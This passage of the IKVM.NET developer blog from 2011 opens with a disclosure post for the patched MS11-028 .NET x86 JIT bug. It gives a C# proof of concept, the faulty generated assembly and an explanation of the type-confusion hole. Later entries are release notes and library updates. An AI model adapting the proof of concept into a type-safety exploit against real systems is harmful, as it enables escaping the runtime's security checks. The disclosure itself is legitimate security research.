<P><CODE><SPAN style="COLOR: blue">using</SPAN> System;<BR><SPAN style="COLOR: blue">using</SPAN> System.Runtime.InteropServices;<BR><SPAN style="COLOR: blue">using</SPAN> System.Runtime.CompilerServices;<BR><BR>[<SPAN style="COLOR: #2b91af">StructLayout</SPAN>(<SPAN style="COLOR: #2b91af">LayoutKind</SPAN>.Sequential, Pack = 1)]<BR><SPAN style="COLOR: blue">public struct</SPAN> <SPAN style="COLOR: #2b91af">RunLong</SPAN> {<BR>&nbsp; <SPAN style="COLOR: blue">public byte</SPAN> Count;<BR>&nbsp; <SPAN style="COLOR: blue">public long</SPAN> Value;<BR><BR>&nbsp; <SPAN style="COLOR: blue">public</SPAN> RunLong(<SPAN style="COLOR: blue">byte</SPAN> count, <SPAN style="COLOR: blue">long</SPAN> value) {<BR>&nbsp;&nbsp;&nbsp; Count = count;<BR>&nbsp;&nbsp;&nbsp; Value = value;<BR>&nbsp; }<BR>}<BR><BR><SPAN style="COLOR: blue">class</SPAN> <SPAN style="COLOR: #2b91af">Program</SPAN> {<BR>&nbsp; <SPAN style="COLOR: blue">static void</SPAN> Main(<SPAN style="COLOR: blue">string</SPAN>[] args) {<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">try</SPAN> {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <SPAN style="BACKGROUND-COLOR: yellow">Whoop(<SPAN style="COLOR: blue">null</SPAN>, <SPAN style="COLOR: blue">null</SPAN>, args, <SPAN style="COLOR: blue">null</SPAN>, Frob(<SPAN style="COLOR: blue">new</SPAN> <SPAN style="COLOR: #2b91af">RunLong</SPAN>(1, 0)));</SPAN><BR>&nbsp;&nbsp;&nbsp; } <SPAN style="COLOR: blue">catch</SPAN> { }<BR>&nbsp; }<BR><BR>&nbsp; [<SPAN style="COLOR: #2b91af">MethodImpl</SPAN>(<SPAN style="COLOR: #2b91af">MethodImplOptions</SPAN>.NoInlining)]<BR>&nbsp; <SPAN style="COLOR: blue">private static object</SPAN> Frob(<SPAN style="COLOR: #2b91af">RunLong</SPAN> runLong) {<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">return null</SPAN>;<BR>&nbsp; }<BR><BR>&nbsp; [<SPAN style="COLOR: #2b91af">MethodImpl</SPAN>(<SPAN style="COLOR: #2b91af">MethodImplOptions</SPAN>.NoInlining)]<BR>&nbsp; <SPAN style="COLOR: blue">private static void</SPAN> Whoop(<SPAN style="COLOR: blue">object</SPAN> o1, <SPAN style="COLOR: blue">object</SPAN> o2, <SPAN style="COLOR: blue">object</SPAN> o3, <SPAN style="COLOR: #2b91af">Program</SPAN> p, <SPAN style="COLOR: blue">object</SPAN> o5) { <BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: #2b91af">Console</SPAN>.WriteLine(<SPAN style="COLOR: #a31515">"p = "</SPAN> + p);<BR>&nbsp;&nbsp;&nbsp; <SPAN style="COLOR: blue">throw new</SPAN> <SPAN style="COLOR: #2b91af">Exception</SPAN>();<BR>&nbsp; }<BR>}</CODE></P>
<P>Running this on an unpatched system (we compile with /platform:x86, because only the 32 bit JIT is affected):</P>
<P style="BACKGROUND-COLOR: black; FONT-FAMILY: 'Courier New', Courier, monospace; COLOR: #c0c0c0">C:\temp&gt;csc /platform:x86 program.cs<BR><BR>C:\temp&gt;program<BR>p = System.String[]</P>
<P>Here we see that p, typed as Program, contains a string[]. This is a classic type safety hole and can be used like <A href="/PermaLink.aspx?guid=3cc8beef-3424-488d-8429-50e244f15ccc">this</A>.</P>
<P><STRONG>Generated Code</STRONG></P>
<P>Here's the code generated for the highlighted line by the unpatched JIT:</P>
<P><CODE>&nbsp;&nbsp; mov&nbsp;&nbsp; eax,1<BR>&nbsp;&nbsp; xor&nbsp;&nbsp; ecx,ecx<BR>&nbsp;&nbsp; xor&nbsp;&nbsp; edx,edx<BR>&nbsp;&nbsp; push&nbsp; esi<BR>&nbsp;&nbsp; push&nbsp; ecx<BR>&nbsp;&nbsp; push&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; incorrect instruction<BR>&nbsp;&nbsp; push&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; incorrect instruction<BR>&nbsp;&nbsp; mov&nbsp;&nbsp; word ptr [esp+1],cs&nbsp;&nbsp;&nbsp;&nbsp;; incorrect instruction<BR>&nbsp;&nbsp; call&nbsp; Frob<BR>&nbsp;&nbsp; push&nbsp; eax<BR>&nbsp;&nbsp; xor&nbsp;&nbsp; edx,edx<BR>&nbsp;&nbsp; xor&nbsp;&nbsp; ecx,ecx<BR>&nbsp;&nbsp; call&nbsp; Whoop</CODE></P>
<P>The three incorrect instructions are supposed to push the RunLong value on the stack (padded to 12 bytes), but instead push 8 bytes (and an incorrect value) and store the cs segment register (?). This causes the stack to become unbalanced (because Frob pops 12 bytes off the stack) and the result is that the third parameter to Whoop (o3) ends up in the place of fourth parameter (p).</P>
<P>The resulting unbalanced stack would result in a crash, so Whoop throws an exception to restore the stack to a sane state.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/19/2011 13:54:49 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=19f8fefc-d782-48ef-8c6c-f4a2aef471e4"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=19f8fefc-d782-48ef-8c6c-f4a2aef471e4">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 13 April 2011</h2></div>
<div class="newsItems"><a name="a7c6beb13-701d-48da-8030-929b353f0fbe"></a><div class="entry">
	<h3 class="entryTitle">MS11-028 Vulnerability Details</h3>
	<div class="entryBody">
		<P>Next week I will post the details of the bug fixed in <A href="http://www.microsoft.com/technet/security/Bulletin/MS11-028.mspx">MS11-028</A> released yesterday.</P>
<P>I did not discover this vulnerability, but in Februari I did find a public bug report that contains enough information to write an exploit and I contacted the Microsoft Security Response Center and they replied:</P>
<P><EM>&#8220;Thank you for contacting us with this. We are aware of the issue you are reporting and since the issue is public I can not comment on the issue or the status of the investigation except to say that we are aware and investigating.&#8220;</EM></P>
<P>The bug&nbsp;was originally reported in August of last year.</P>
<P>After I saw the bug report it took me about 15 minutes to write a proof of concept&nbsp;exploit.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/13/2011 23:21:33 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7c6beb13-701d-48da-8030-929b353f0fbe"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7c6beb13-701d-48da-8030-929b353f0fbe">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 01 April 2011</h2></div>
<div class="newsItems"><a name="a047b1e23-953a-467f-9862-13ee0ed82270"></a><div class="entry">
	<h3 class="entryTitle">MIX11</h3>
	<div class="entryBody">
		<P>I'll be at <A href="http://live.visitmix.com/">MIX</A> this year. If you want to meet up for a&nbsp;chat, drop me a <A href="mailto:jeroen@frijters.net">note</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/01/2011 17:21:09 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=047b1e23-953a-467f-9862-13ee0ed82270"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=047b1e23-953a-467f-9862-13ee0ed82270">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 24 March 2011</h2></div>
<div class="newsItems"><a name="a94934445-9b06-4a81-b76b-fcd23d4f6ec2"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 0.46 Released</h3>
	<div class="entryBody">
		<P>I've <A href="http://sourceforge.net/project/showfiles.php?group_id=69637">released IKVM.NET 0.46</A> to SourceForge. The binaries are identical to the ones in <A HREF="/PermaLink.aspx?guid=ce2a9a04-cc4b-4c9d-af24-910e0dab641f">release candidate 1</A>.</P>
<P><B>Release Notes</B></P>
<P>This document lists the improvements, known issues and incompatibilities.</P>
<P><STRONG>What's New</STRONG> (relative to <A HREF="/PermaLink.aspx?guid=6f3a513b-cba7-497e-be25-82ba96e13f40">IKVM.NET 0.44</A>):</P>
<UL>
<LI>Integrated OpenJDK 6 b22. </LI>
<LI>Added -Xreference: option to ikvm.exe and ikvm.runtime.Startup.addBootClassPathAssemby() API. </LI>
<LI>The binaries zip now includes lib/ikvm-api.jar to avoid having to run ikvmstub to get access to the IKVM Java APIs. </LI>
<LI>Ported parts of fdlibm to C# to use for StrictMath methods tan, cbrt, floor, pow, hypot, expm1 and log1p. </LI>
<LI>Add support for serializing .NET exceptions in Java. We don't serialize the actual object, but a placeholder instead, to avoid having to implement full .NET serialization interop. </LI>
<LI>Added IL optimization step to code generator. </LI>
<LI>Added <A HREF="/PermaLink.aspx?guid=acb57d2a-c07a-4838-909a-3d073bdbfdf5">SynchronizationContext</A> for AWT event thread. </LI>
<LI>Many IKVM.Reflection improvements and bug fixes. </LI>
<LI>Many Swing/AWT/font/graphics/printing improvements. </LI>
<LI>Implemented IPv6 support (.NET only) for java.net package APIs. </LI>
<LI>The sun.boot.class.path system property now points to VFS to allow javac to work (although a bit slow, because the stub class files are dynamically generated on demand). </LI>
<LI><A HREF="/PermaLink.aspx?guid=ac6cfb6a-6138-4c36-895e-636c77242e39">Resource and generated stub classes</A> are now projected into the virtual IKVM home directory, to make code that assumes that resources live in jars happy. </LI>
<LI>Improvements to @ikvm.lang.Internal handling. </LI>
<LI>Many minor improvements.</LI></UL>
<P><B>Runtime</B></P>
<UL>
<LI>Code unloading (aka class GC) is not supported. 
<LI>In Java static initializers can deadlock, on .NET some threads can see uninitialized state in cases where deadlock would occur on the JVM. 
<LI>JNI<BR>&nbsp; 
<UL>
<LI>Only supported in the default AppDomain. 
<LI>Only the JNICALL calling convention is supported! (On Windows, HotSpot appears to also support the cdecl calling convention). 
<LI>Cannot call string contructors on already existing string instances 
<LI>A few limitations in Invocation API support<BR>&nbsp; 
<UL>
<LI>The Invocation API is only supported when running on .NET. 
<LI>JNI_CreateJavaVM: init options "-verbose[:class|:gc|:jni]", "vfprintf", "exit" and "abort" are not implemented. The JDK 1.1 version of JavaVMInitArgs isn't supported. 
<LI>JNI_GetDefaultJavaVMInitArgs not implemented 
<LI>JNI_GetCreatedJavaVMs only returns the JavaVM if the VM was started through JNI or a JNI call that retrieves the JavaVM has already occurred. 
<LI>DestroyJVM is only partially implemented (it waits until there are no more non-daemon Java threads and then returns JNI_ERR). 
<LI>DetachCurrentThread doesn't release monitors held by the thread.</LI></UL>
<LI>Native libraries are never unloaded (because code unloading is not supported).</LI></UL>
<LI>The JVM allows any reference type to be passed where an interface reference is expected (and to store any reference type in an interface reference type field), on IKVM this results in an IncompatibleClassChangeError. 
<LI>monitorenter / monitorexit cannot be used on unitialized this reference. 
<LI>Floating point is not fully spec compliant. 
<LI>A method returning a boolean that returns an integer other than 0 or 1 behaves differently (this also applies to byte/char/short and for method parameters). 
<LI>Synchronized blocks are not async exception safe. 
<LI>Ghost arrays don't throw ArrayStoreException when you store an object that doesn't implement the ghost interface. 
<LI>Class loading is more eager than on the reference VM. 
<LI>Interface implementation methods are never really final (interface can be reimplemented by .NET subclasses). 
<LI>JSR-133 finalization spec change is not fully implemented. The JSR-133 changes dictate that an object should not be finalized unless the Object constructor has run successfully, but this isn't implemented.</LI></UL>
<P><B>Static Compiler (ikvmc)</B></P>
<UL>
<LI>Some subtle differences with ikvmc compiled code for public members inherited from non-public base classes (so called "access stubs"). Because the access stub lives in a derived class, when accessing a member in a base class, the derived cctor will be run whereas java (and ikvm) only runs the base cctor. 
<LI>Try blocks around base class ctor invocation result in unverifiable code (no known compilers produce this type of code). 
<LI>Try/catch blocks before base class ctor invocation result in unverifiable code (this actually happens with the Eclipse compiler when you pass a class literal to the base class ctor and compile with -target 1.4). 
<LI>Only code compiled together during a single compilation fully obeys the JLS binary compatibility rules. </LI></UL>
<P><B>Class Library</B></P>
<P>Most class library code is based on OpenJDK 6 build 22. Below is a list of divergences and IKVM.NET specific implementation notes.</P>
<TABLE cellSpacing=0>
<TBODY>
<TR>
<TD style="BORDER-TOP: black 1px solid">com.sun.security.auth.module&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD style="BORDER-TOP: black 1px solid">Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.applet</TD>
<TD>GNU Classpath implementation. Not implemented.</TD></TR>
<TR>
<TD>java.awt</TD>
<TD>Partial System.Windows.Forms based back-end. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.io.Console</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.lang.instrument</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.lang.management</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.net</TD>
<TD>IPv6 support at level equivalent to JDK 6 (only on .NET).</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.net.ProxySelector</TD>
<TD>Getting the default system proxy for a URL is not implemented.</TD></TR>
<TR>
<TD>java.text.Bidi</TD>
<TD>GNU Classpath implementation. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.util.zip</TD>
<TD>Partially based on GNU Classpath implementation.</TD></TR>
<TR>
<TD>javax.imageio.plugins.jpeg</TD>
<TD>Partial implementation. JPEGs can be read and written, but there is no metadata support.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.management</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.print</TD>
<TD>There is a Win32 specific printing implementation. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.script</TD>
<TD>ECMAScript implementation is not included.</TD></TR>
<TR>
<TD>javax.smartcardio</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.sound</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.swing</TD>
<TD>Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.tools</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>org.ietfs.jgss</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>sun.jdbc.odbc</TD>
<TD>Implementation based on .NET ODBC managed provider.</TD></TR>
<TR>
<TD>sun.net.www.content.audio</TD>
<TD>Audio content handlers not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD style="BORDER-BOTTOM: black 1px solid">sun.net.www.content.image</TD>
<TD style="BORDER-BOTTOM: black 1px solid">Not supported.</TD></TR></TBODY></TABLE>
<P>The entire public API is available, so "Not implemented." for javax.smartcardio, for example, means that the API is there but there is no back-end to provide the actual smartcard communication support. "Not supported." means that the code is there and probably works at least somewhat, but that I'm less likely to fix bugs reported in these areas, but patches are welcome, of course.</P>
<P>Specific API notes:</P>
<UL>
<LI>java.lang.Thread.stop(Throwable t) doesn't support throwing arbitrary exceptions on other threads (only java.lang.ThreadDeath). 
<LI>java.lang.Thread.holdsLock(Object o) causes a spurious notify on the object (this is allowed by the J2SE 5.0 spec). 
<LI>java.lang.String.intern() strings are never garbage collected. 
<LI>Weak/soft references and reference queues are inefficient and do not fully implement the required semantics. 
<LI>java.lang.ref.SoftReference: Soft references are not guaranteed to be cleared before an OutOfMemoryError is thrown. 
<LI>Threads started outside of Java aren't "visible" (e.g. in ThreadGroup.enumerate()) until they first call Thread.currentThread(). 
<LI>java.lang.Thread.getState() returns WAITING or TIMED_WAITING instead of BLOCKING when we're inside Object.wait() and blocking to re-acquire the monitor. 
<LI>java.nio.channel.FileChannel.lock() shared locks are only supported on Windows NT derived operating systems. 
<LI>java.lang.SecurityManager: Deprecated methods not implemented: classDepth(String), inClass(String), classLoaderDepth(), currentLoadedClass(), currentClassLoader(), inClassLoader()</LI></UL>
<P><B>Supported Platforms</B></P>
<P>This release has been tested on the following CLI implementations / platforms:</P>
<TABLE border=0>
<TBODY>
<TR>
<TD><B>CLI Implementation&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Architecture&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Operating System</B></TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x86</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x64</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 4.0</TD>
<TD>x86</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 4.0</TD>
<TD>x64</TD>
<TD>Windows</TD></TR></TBODY></TABLE>
<P><BR><B>Partial Trust</B></P>
<P>There is experimental support for running in partial trust.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/24/2011 06:50:18 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=94934445-9b06-4a81-b76b-fcd23d4f6ec2"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=94934445-9b06-4a81-b76b-fcd23d4f6ec2">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 23 March 2011</h2></div>
<div class="newsItems"><a name="aaeaa0190-2b32-45e6-a249-3c3cf126372b"></a><div class="entry">
	<h3 class="entryTitle">IKVM.Reflection Update</h3>
	<div class="entryBody">
		<p><strong>Missing Members</strong></p>
<p>To support
<a HREF="/PermaLink.aspx?guid=9c821dd7-d0b4-43df-a7fc-40eca7d0c6d7">
mcs</a> I previously added some limited support for missing members. This has 
now been extended substantially to allow full fidelity reading/writing of 
assemblies. Normally IKVM.Reflection behaves like System.Reflection in how it 
tries to resolve member and assembly references, but now it is possible to 
customize this to enable reading a module without resolving any dependencies.</p>
<p><strong>Roundtripping</strong></p>
<p>To test this version of IKVM.Reflection, I&#39;ve roundtripped 1758 (non-C++/CLI) modules from the 
CLR GAC plus the Mono 2.10 directories on my system. Roundtripping here means 
reading in the module and writing it back out. The original module and resulting 
module are both disassembled with ildasm and the resulting IL files compared 
(after going through two dozen regex replacements to filter out some trivial 
differences).</p>
<p>The code I used for the roundtripping is an (d)evolution of the linker prototype 
code. It is available <a href="http://www.frijters.net/roundtripping.zip">here</a>. 
Note that it is very far from production quality, but does make for a good case 
study in how to use the advanced IKVM.Reflection functionality.</p>
<p><strong>Unmanaged Exports</strong></p>
<p>A cool CLR feature is the ability to export static managed methods as unmanaged DLL exports. The only languages that support this, AFAIK, are C++/CLI and ILASM, but now you easily do it with IKVM.Reflection as well. Below is a Hello World example. Note that while this example exports a global method, you can export any static method. 
Note also that the string passed in must be ASCII, may be null and that the 
ordinal must be a 16 bit value that is unique (in the scope of the module).</p>
<p><code><span style="COLOR: blue">using</span> IKVM.Reflection;<br />
<span style="COLOR: blue">using</span> IKVM.Reflection.Emit;<br />
<br />
<span style="COLOR: blue">class</span> <span style="COLOR: #2b91af">Demo</span><br />
{<br />
&nbsp;
<span style="COLOR: blue">static void</span> Main()<br />
&nbsp;
{<br />
&nbsp;&nbsp;&nbsp;
<span style="COLOR: blue">var</span> universe = <span style="COLOR: blue">new</span> <span style="COLOR: #2b91af">Universe</span>();<br />
&nbsp;&nbsp;&nbsp;
<span style="COLOR: blue">var</span> name = <span style="COLOR: blue">new</span> <span style="COLOR: #2b91af">AssemblyName</span>(<span style="COLOR: #a31515">&quot;ExportDemo&quot;</span>);<br />
&nbsp;&nbsp;&nbsp;
<span style="COLOR: blue">var</span> ab = universe.DefineDynamicAssembly(name, <span style="COLOR: #2b91af">AssemblyBuilderAccess</span>.Save);<br />
&nbsp;&nbsp;&nbsp;
<span style="COLOR: blue">var</span> modb = ab.DefineDynamicModule(<span style="COLOR: #a31515">&quot;ExportDemo&quot;</span>, <span style="COLOR: #a31515">&quot;ExportDemo.dll&quot;</span>);<br />
&nbsp;&nbsp;&nbsp;
<span style="COLOR: blue">var</span> mb = modb.DefineGlobalMethod(<span style="COLOR: #a31515">&quot;HelloWorld&quot;</span>, <span style="COLOR: #2b91af">MethodAttributes</span>.Static, <span style="COLOR: blue">null</span>, <span style="COLOR: blue">null</span>);<br />
&nbsp;&nbsp;&nbsp;
<span style="COLOR: blue">var</span> ilgen = mb.GetILGenerator();<br />
&nbsp;&nbsp;&nbsp;
ilgen.EmitWriteLine(<span style="COLOR: #a31515">&quot;Hello World&quot;</span>);<br />
&nbsp;&nbsp;&nbsp;
ilgen.Emit(<span style="COLOR: #2b91af">OpCodes</span>.Ret);<br />
&nbsp;&nbsp;&nbsp;
<strong>mb.__AddUnmanagedExport(</strong><span style="COLOR: #a31515"><strong>&quot;HelloWorld&quot;</strong></span><strong>, 1);</strong><br />
&nbsp;&nbsp;&nbsp;
modb.CreateGlobalFunctions();<br />
&nbsp;&nbsp;&nbsp;
ab.Save(<span style="COLOR: #a31515">&quot;ExportDemo.dll&quot;</span>, <span style="COLOR: #2b91af">PortableExecutableKinds</span>.Required32Bit, <span style="COLOR: #2b91af">ImageFileMachine</span>.I386);<br />
&nbsp;
}<br />
}</code></p>
<p>The resulting ExportDemo.dll can now be called from native code in the usual ways, for example:</p>
<p><code>&nbsp;&nbsp;&nbsp; <span style="COLOR: blue">typedef void</span> (<span style="COLOR: blue">__stdcall</span> * 
PROC)();<br />
&nbsp;&nbsp;&nbsp;
HMODULE hmod = LoadLibrary(L<span style="COLOR: #a31515">&quot;ExportDemo.dll&quot;</span>);<br />
&nbsp;&nbsp;&nbsp;
PROC proc = (PROC)GetProcAddress(hmod, <span style="COLOR: #a31515">&quot;HelloWorld&quot;</span>);<br />
&nbsp;&nbsp;&nbsp;
proc();</code></p>
<p>Creating unmanaged exports is supported for I386 and AMD64. Itanium (IA64) support has not been implemented.</p>
<p><strong>What's Missing</strong></p>
<p>It should now be possible to write an ILDASM clone using IKVM.Reflection, however 
to be able to write ILASM there are still a couple of things missing:</p>
<ul>
<li>Function pointers (used by C++/CLI).</li>
<li>API to create missing type.</li>
<li>Preserving interleaved modopt/modreq ordering.</li>
<li>Various C++/CLI quirks (e.g. custom modifiers on local variable signatures).</li>
<li>Ability to set file alignment.</li>
</ul>
<p><strong>Changes:</strong></p>
<ul>
<li>Added support for using missing members in emitted assembly.</li>
<li>If you build IKVM.Reflection with the STABLE_SORT symbol defined, all metadata 
sorting will be done in a stable way, thus retaining the order in which the 
items are defined.</li>
<li>When target is .NET 1.x adjust the type name writing algorithm to match the 
quirks of the Microsoft .NET 1.x metadata writer.</li>
<li>Fixed Type.StructLayoutAttribute to be (bug) compatible with .NET.</li>
<li>Don&#39;t map unspecified pinvoke calling convention to winapi.</li>
<li>Don&#39;t needlessly read the contents of a resource module.</li>
<li>Automatically emit .NET 1.x compatible declarative security when appropriate.</li>
<li>Added support for having multiple mscorlib versions in a universe.</li>
<li>Added Assembly.__AssemblyFlags property.</li>
<li>Added CustomAttributeBuilder.__FromBlob().</li>
<li>Added CustomAttributeBuilder.__MakeTypedArgument() to make it possible to box an 
enum or create an array of an enum type in a location typed as object.</li>
<li>Added ILGenerator.__MaxStackSize property.</li>
<li>Added EventInfo.__GetMethods().</li>
<li>Added FieldBuilder.__SetReadOnlyDataAndRVA().</li>
<li>Added FieldInfo.__FieldRVA property.</li>
<li>Added FieldInfo.__GetFieldOnTypeDefinition().</li>
<li>Added ManifestResourceInfo.__ResourceAttributes property.</li>
<li>Added MethodBase.__GetMethodOnTypeDefinition().</li>
<li>Added MethodBuilder.__AddUnmanagedExport().</li>
<li>Added MethodBuilder.__SetCallingConvention().</li>
<li>Added Module.__ImageBase property.</li>
<li>Added Module.__GetCustomAttributesFor().</li>
<li>Added Module.__GetExportedTypes().</li>
<li>Added Module.__GetReferencedModules().</li>
<li>Added Module.__GetReferencedTypes().</li>
<li>Added Module.__GetSectionInfo().</li>
<li>Added Module.__ModuleHash property (for resource modules).</li>
<li>Added Module.__ReadDataFromRVA().</li>
<li>Added Module.__ResolveReferencedAssemblies().</li>
<li>Added Module.__StackReserve property.</li>
<li>Added ModuleBuilder.__AddModule().</li>
<li>Added ModuleBuilder.__AddModuleReference().</li>
<li>Added ModuleBuilder.__AddAssemblyReference(AssemblyName, Assembly) overload.</li>
<li>Added ModuleBuilder.__AddUnmanagedExportStub().</li>
<li>Added ModuleBuilder.__AddVTableFixups().</li>
<li>Added ModuleBuilder.__SetCustomAttributeFor().</li>
<li>Added ModuleBuilder.__SetModuleVersionId().</li>
<li>Added ModuleBuilder.__SetStackReserve().</li>
<li>Added PropertyInfo.__CallingConvention property.</li>
<li>Added Type.__GetLayout().</li>
<li>Added Type.__CreateMissingMethod(), Type.__CreateMissingField() and 
MissingGenericMethodBuilder.</li>
<li>Added Type.__GetArraySizes() and Type.__GetArrayLowerBounds().</li>
<li>Added Type.__MakeArrayType() overload that takes sizes and lower bounds.</li>
<li>Added TypeBuilder.__SetLayout().</li>
</ul>
<p>Binary available here: <a href="http://www.frijters.net/IKVM.Reflection-0.47.4098.zip">IKVM.Reflection-0.47.4098.zip</a></p>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/23/2011 08:04:24 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=aeaa0190-2b32-45e6-a249-3c3cf126372b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=aeaa0190-2b32-45e6-a249-3c3cf126372b">Comments [6]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 17 March 2011</h2></div>
<div class="newsItems"><a name="ace2a9a04-cc4b-4c9d-af24-910e0dab641f"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 0.46 Release Candidate 1</h3>
	<div class="entryBody">
		<P>A new release candidate is available.</P>
<P>Changes since previous release candidate:</P>
<UL>
<LI>Changed version to 0.46.0.1.</LI>
<LI>Zip inflater fix (Classpath bug <A href="http://gcc.gnu.org/bugzilla/show_bug.cgi?id=48131">#48131</A>).</LI>
<LI>Support loading resources from assemblies added to the boot classloader (with ikvm.runtime.Startup.addBootClassPathAssemby()).</LI>
<LI>IKVM.Reflection: ILGenerator.BeginExceptFilterBlock() should behave like BeginCatchBlock(), not BeginFinallyBlock().</LI>
<LI>IKVM.Reflection: Type.FullName for a generic type should separate type parameters by commas.</LI>
<LI>IKVM.Reflection: Type.FullName for a generic type should only escape the ']' characters in the assembly names of type parameters.</LI>
<LI>IKVM.Reflection: &lt;Module&gt; should not extend object.</LI>
<LI>IKVM.Reflection: String literals should be read in "as-is", not interpreted as UTF-16.</LI>
<LI>IKVM.Reflection: MethodBody.MaxStack returned incorrect value for tiny header methods.</LI>
<LI>IKVM.Reflection: Getting Module methods/fields should not try to look at the base class of the &lt;Module&gt; type.</LI>
<LI>IKVM.Reflection: Align initialized data arrays on 8 byte boundary.</LI>
<LI>IKVM.Reflection: Align managed resources on 8 byte boundary.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.46.0.1.zip">ikvmbin-0.46.0.1.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-0.46.0.1.zip">ikvmsrc-0.46.0.1.zip</A>, <A href="http://www.frijters.net/openjdk6-b22-stripped.zip">openjdk6-b22-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/17/2011 06:49:16 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ce2a9a04-cc4b-4c9d-af24-910e0dab641f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ce2a9a04-cc4b-4c9d-af24-910e0dab641f">Comments [4]</a>
		
		<br clear="all">
	</div>
